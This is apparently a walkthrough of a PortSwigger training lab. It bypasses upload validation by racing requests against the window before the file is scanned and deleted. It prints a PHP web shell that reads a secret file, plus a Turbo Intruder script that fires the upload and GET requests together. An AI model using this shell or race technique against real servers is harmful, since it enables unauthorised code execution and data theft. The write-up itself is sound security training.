# Lab : Web shell upload via race condition

[**Click here to enter the Lab**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

---

## Lab Description

This lab contains a vulnerable image upload function. Although it performs robust validation on uploaded files, it is possible to bypass this validation by exploiting a **race condition** in the way it processes files.

To solve the lab, you need to:

* Upload a **PHP web shell** to the server.
* Exploit the **time window** during validation to execute the shell.
* Use it to **read the contents** of the file located at `/home/carlos/secret`.
* Submit the secret using the button provided in the lab banner.

You can log in to your own account using the following credentials:

* **Username:** `wiener`
* **Password:** `peter`

---

## Solution


- At first I will login with credentials ( `wiener` , `peter` ) .
- Go to **Image upload** functionality in **My Account** page.
  
  ![image](https://github.com/user-attachments/assets/d4334f56-b363-438e-a692-21cbda6a13e0)

- At previous labs we write a simple web shell in a file and named it `SimpleShell.php` that's content is :
  
```php
<?php
echo "<pre>";
echo file_get_contents("/home/carlos/secret");
echo "</pre>";
?>
```

it's role is to print content of `/home/carlos/secret` 

- Now upload this file using **Image upload** functionality.Observe we got an error :
  
  ![p](https://github.com/user-attachments/assets/2210b549-35b3-45b6-ba48-5ac905fb7453)

* The server performs strong validation (likely MIME & content inspection).
* The request is rejected – but the file gets temporarily saved in the public folder before being scanned and deleted.

This is the vulnerability : The race condition exists in the time window between file being uploaded and file being scanned + deleted.

> While testing in Burp Suite Repeater, the upload request took a few seconds longer than expected to receive a response.
This delay clearly indicates that the server stores the uploaded file first, then performs backend processing (e.g., virus scan or validation) before rejecting the file.
This timing gap is exactly what makes the race condition exploit possible.

---

### Perform Race condition 

> A **race condition** happens when two or more operations run at the same time, and the outcome depends on the timing between them. it can be exploited when a file or action is **temporarily accessible** before security checks are fully completed.


**At first** : Install & Use Turbo Intruder
Install Turbo Intruder from the Burp BApp Store.

Go to the POST /my-account/avatar request that attempted uploading SimpleShell.php.

Right-click → Extensions → Turbo Intruder → Send to turbo intruder

![t](https://github.com/user-attachments/assets/96e184b0-648a-4a1f-981d-87cf93e49888)

![AM](https://github.com/user-attachments/assets/ae57f24b-8d1c-4a9b-b050-ac555aaf742f)


---

### Turbo Intruder Exploit Script 

I will use the script to send a POST upload, immediately followed by multiple GET requests:


* Post request :
  
![tAM](https://github.com/user-attachments/assets/eafc05fe-9e99-4ea0-bd65-63485ba52efe)

* Get request : 

![pi](https://github.com/user-attachments/assets/ff995ef0-6104-4d67-8bfb-f3a33b232280)

- The script will be like this :

```python
  def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)

    request1 = '''Post Request that contain web shell'''

    request2 = '''GET Request'''

    # Queue the POST request and multiple GET requests with gating for race condition
    engine.queue(request1, gate='race1')
    for _ in range(5):
        engine.queue(request2, gate='race1')

    # Release the gate to send all queued requests simultaneously
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)

```

### That will be like this : 

![image](https://github.com/user-attachments/assets/55594cb5-5a2d-4500-809b-2f3b9fb47938)

Run the Attack
Click Attack in Turbo Intruder.

Look at the response results.

> Some of the GET requests return a 200 OK with the secret inside – this means you hit the small time window before validation deleted the file.

![ppp](https://github.com/user-attachments/assets/c1d45b43-74b6-4c20-b579-ced9ec28315c)

![parite](https://github.com/user-attachments/assets/b6d669ec-802f-4a67-b3c5-37f6db8b6300)

---

- ## Copy the secret and submit it in the browser to solve the lab successfully …

![uu](https://github.com/user-attachments/assets/8b322fa0-6dae-4d82-bb86-839978d5e3ca)


![oo](https://github.com/user-attachments/assets/0631da23-3da9-43c0-a26c-bc3d1db5642d)
